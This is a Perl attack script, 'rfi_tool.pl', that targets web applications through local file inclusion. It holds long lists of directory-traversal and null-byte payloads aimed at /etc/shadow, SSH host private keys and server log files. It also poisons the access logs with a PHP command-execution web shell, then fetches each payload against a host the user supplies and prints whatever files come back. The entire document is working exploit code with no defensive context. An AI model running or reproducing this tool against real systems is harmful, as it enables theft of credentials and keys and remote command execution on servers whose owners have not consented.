use LWP::UserAgent;
use IO::Socket;
use LWP::Simple;

$log="../";

$path1 = "../"x10;
$path2 = "..%01/"x10;
@apache_all=(
$path1."etc/passwd%00index.html",
$path1."etc/shadow%00index.html",
$path1."etc/ssh/ssh_config%00index.html",
$path1."etc/ssh/ssh_host_rsa_key%00index.html",
$path1."etc/ssh/ssh_host_rsa_key.pub%00index.html",
$path1."etc/ssh/ssh_host_dsa_key%00index.html",
$path1."etc/ssh/ssh_host_dsa_key.pub%00index.html",
$path1."root/proof.txt%00index.html",
$path1."etc/passwd%00index.html",
$path1."etc/shadow%00index.htm",
$path1."etc/ssh/ssh_config%00index.htm",
$path1."etc/ssh/ssh_host_rsa_key%00index.htm",
$path1."etc/ssh/ssh_host_rsa_key.pub%00index.htm",
$path1."etc/ssh/ssh_host_dsa_key%00index.htm",
$path1."etc/ssh/ssh_host_dsa_key.pub%00index.htm",
$path1."root/proof.txt%00index.htm",
$path1."etc/passwd%00index.html?",
$path1."etc/shadow%00index.html?",
$path1."etc/ssh/ssh_config%00index.html?",
$path1."etc/ssh/ssh_host_rsa_key%00index.html?",
$path1."etc/ssh/ssh_host_rsa_key.pub%00index.html?",
$path1."etc/ssh/ssh_host_dsa_key%00index.html?",
$path1."etc/ssh/ssh_host_dsa_key.pub%00index.html?",
$path1."root/proof.txt%00index.html?",
$path1."etc/passwd%00index.html?",
$path1."etc/shadow%00index.htm?",
$path1."etc/ssh/ssh_config%00index.htm?",
$path1."etc/ssh/ssh_host_rsa_key%00index.htm?",
$path1."etc/ssh/ssh_host_rsa_key.pub%00index.htm?",
$path1."etc/ssh/ssh_host_dsa_key%00index.htm?",
$path1."etc/ssh/ssh_host_dsa_key.pub%00index.htm?",
$path1."root/proof.txt%00index.htm?",
$path1."etc/passwd%00index.html???",
$path1."etc/shadow%00index.html???",
$path1."etc/ssh/ssh_config%00index.html???",
$path1."etc/ssh/ssh_host_rsa_key%00index.html???",
$path1."etc/ssh/ssh_host_rsa_key.pub%00index.html???",
$path1."etc/ssh/ssh_host_dsa_key%00index.html???",
$path1."etc/ssh/ssh_host_dsa_key.pub%00index.html???",
$path1."root/proof.txt%00index.html???",
$path1."etc/passwd%00index.html???",
$path1."etc/shadow%00index.htm???",
$path1."etc/ssh/ssh_config%00index.htm???",
$path1."etc/ssh/ssh_host_rsa_key%00index.htm???",
$path1."etc/ssh/ssh_host_rsa_key.pub%00index.htm???",
$path1."etc/ssh/ssh_host_dsa_key%00index.htm???",
$path1."etc/ssh/ssh_host_dsa_key.pub%00index.htm???",
$path1."root/proof.txt%00index.htm???",
$path1."etc/passwd%00index.html%00",
$path1."etc/shadow%00index.html%00",
$path1."etc/ssh/ssh_config%00index.html%00",
$path1."etc/ssh/ssh_host_rsa_key%00index.html%00",
$path1."etc/ssh/ssh_host_rsa_key.pub%00index.html%00",
$path1."etc/ssh/ssh_host_dsa_key%00index.html%00",
$path1."etc/ssh/ssh_host_dsa_key.pub%00index.html%00",
$path1."root/proof.txt%00index.html%00",
$path1."etc/passwd%00index.html%00",
$path1."etc/shadow%00index.htm%00",
$path1."etc/ssh/ssh_config%00index.htm%00",
$path1."etc/ssh/ssh_host_rsa_key%00index.htm%00",
$path1."etc/ssh/ssh_host_rsa_key.pub%00index.htm%00",
$path1."etc/ssh/ssh_host_dsa_key%00index.htm%00",
$path1."etc/ssh/ssh_host_dsa_key.pub%00index.htm%00",
$path1."root/proof.txt%00index.htm%00",
"unauthenticated/".$path2."etc/passwd",
"unauthenticated/".$path2."etc/shadow",
"unauthenticated/".$path2."etc/ssh/ssh_config",
"unauthenticated/".$path2."etc/ssh/ssh_host_rsa_key",
"unauthenticated/".$path2."etc/ssh/ssh_host_rsa_key.pub",
"unauthenticated/".$path2."etc/ssh/ssh_host_dsa_key",
"unauthenticated/".$path2."etc/ssh/ssh_host_dsa_key.pub",
"unauthenticated/".$path2."root/proof.txt",
"unauthenticated/".$path2."etc/passwd?",
"unauthenticated/".$path2."etc/shadow?",
"unauthenticated/".$path2."etc/ssh/ssh_config?",
"unauthenticated/".$path2."etc/ssh/ssh_host_rsa_key?",
"unauthenticated/".$path2."etc/ssh/ssh_host_rsa_key.pub?",
"unauthenticated/".$path2."etc/ssh/ssh_host_dsa_key?",
"unauthenticated/".$path2."etc/ssh/ssh_host_dsa_key.pub?",
"unauthenticated/".$path2."root/proof.txt?",
"unauthenticated/".$path2."etc/passwd???",
"unauthenticated/".$path2."etc/shadow???",
"unauthenticated/".$path2."etc/ssh/ssh_config???",
"unauthenticated/".$path2."etc/ssh/ssh_host_rsa_key???",
"unauthenticated/".$path2."etc/ssh/ssh_host_rsa_key.pub???",
"unauthenticated/".$path2."etc/ssh/ssh_host_dsa_key???",
"unauthenticated/".$path2."etc/ssh/ssh_host_dsa_key.pub???",
"unauthenticated/".$path2."root/proof.txt???",
"unauthenticated/".$path2."etc/passwd%00",
"unauthenticated/".$path2."etc/shadow%00",
"unauthenticated/".$path2."etc/ssh/ssh_config%00",
"unauthenticated/".$path2."etc/ssh/ssh_host_rsa_key%00",
"unauthenticated/".$path2."etc/ssh/ssh_host_rsa_key.pub%00",
"unauthenticated/".$path2."etc/ssh/ssh_host_dsa_key%00",
"unauthenticated/".$path2."etc/ssh/ssh_host_dsa_key.pub%00",
"unauthenticated/".$path2."root/proof.txt%00"
);

# Have to fix this mess ... added some windows files.
# Let us keep out these for the moment no neeed to have bulk:
#"index.html?".$path1."WINDOWS/system32/config/sam",
#"index.html?".$path1."WINDOWS/repair/system",
#"index.html?".$path1."WINDOWS/repair/sam",
#

@apache=(
$path1."etc/passwd%00index.html",
$path1."etc/shadow%00index.html",
$path1."etc/ssh/ssh_config%00index.html",
$path1."etc/ssh/ssh_host_rsa_key%00index.html",
$path1."etc/ssh/ssh_host_rsa_key.pub%00index.html",
$path1."etc/ssh/ssh_host_dsa_key%00index.html",
$path1."etc/ssh/ssh_host_dsa_key.pub%00index.html",
$path1."root/proof.txt%00index.html",
$path1."etc/passwd%00index.html",
$path1."etc/shadow%00index.htm",
$path1."etc/ssh/ssh_config%00index.htm",
$path1."etc/ssh/ssh_host_rsa_key%00index.htm",
$path1."etc/ssh/ssh_host_rsa_key.pub%00index.htm",
$path1."etc/ssh/ssh_host_dsa_key%00index.htm",
$path1."etc/ssh/ssh_host_dsa_key.pub%00index.htm",
$path1."root/proof.txt%00index.htm",
"unauthenticated/".$path2."etc/passwd",
"unauthenticated/".$path2."etc/shadow",
"unauthenticated/".$path2."etc/ssh/ssh_config",
"unauthenticated/".$path2."etc/ssh/ssh_host_rsa_key",
"unauthenticated/".$path2."etc/ssh/ssh_host_rsa_key.pub",
"unauthenticated/".$path2."etc/ssh/ssh_host_dsa_key",
"unauthenticated/".$path2."etc/ssh/ssh_host_dsa_key.pub",
"unauthenticated/".$path2."root/proof.txt",
"index.html?".$path1."xampp/FileZillaFtp/FileZilla%20Server.xml",
"index.html?".$path1."boot.ini"
);


@logs=(
"/etc/syslog.conf",
"/var/log/secure",
"/var/log/messages",
"/var/adm",
"/root/.bashrc_history",
"/etc/httpd/logs/access.log",
"/etc/httpd/logs/access_log",
"/etc/httpd/logs/error.log",
"/etc/httpd/logs/error_log",
"/opt/lampp/logs/access_log",
"/usr/local/apache/log",
"/usr/local/apache/logs/access.log",
"/usr/local/apache/logs/error.log",
"/usr/local/etc/httpd/logs/access_log",
"/usr/local/www/logs/thttpd_log",
"/var/apache/logs/error_log",
"/var/log/apache/error.log",
"/var/log/apache-ssl/error.log",
"/var/log/httpd/error_log",
"/var/log/httpsd/ssl_log",
"/var/www/log/access_log",
"/var/www/logs/access.log",
"/var/www/logs/error.log",
"/opt/lampp/logs/error_log",
"/usr/local/apache/logs",
"/usr/local/apache/logs/access_log",
"/usr/local/apache/logs/error_log",
"/usr/local/etc/httpd/logs/error_log",
"/var/apache/logs/access_log",
"/var/log/apache/access.log",
"/var/log/apache-ssl/access.log",
"/var/log/httpd/access_log",
"/var/log/httpsd/ssl.access_log",
"/var/log/thttpd_log",
"/var/www/log/error_log",
"/var/www/logs/access_log",
"/var/www/logs/error_log",
"/proc/self/environ"
);

	my $sis="$^O";if ($sis eq 'MSWin32') { system("cls"); } else { system("clear"); }

	if (@ARGV < 2)
	{
	    print "Usage: ./rfi_tool.pl <Host> <Path>\n";
	    print "Ex. ./rfi_tool.pl www.hackme.com /ktp/index.php?page=\n";
	}

	$host=$ARGV[0];
	$path=$ARGV[1];

	if ( $host   =~   /^http:/ ) {$host =~ s/http:\/\///g;}

	print "\nTrying to read content...\n";
	$CODE="<?php if(get_magic_quotes_gpc()){ \$_GET[cmd]=stripslashes(\$_GET[cmd]);} passthru(\$_GET[cmd]);?>";
	$socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$host", PeerPort=>"80") or die "Could not connect to host.\n\n";
	print $socket "GET /cwhunderground "."\#\#%\$\$%\#\#".$CODE."\#\#%\$\$%\#\#"." HTTP/1.1\r\n";
	print $socket "Host: ".$host."\r\n";
	print $socket "Connection: close\r\n\r\n";
	close($socket);

	if ( $host   !~   /^http:/ ) {$host = "http://" . $host;}

	foreach $getlog(@apache)
                {
                  chomp($getlog);
		  $find= $host.$path.$getlog."%00";
                  $xpl = LWP::UserAgent->new() or die "Could not initialize browser\n";
		  $req = HTTP::Request->new(GET => $find);
		  $res = $xpl->request($req);
		  $info = $res->content;
if ( index($info, 'html' ) == -1) {
print "Reading ".$getlog."\n";
print $info;}
                }

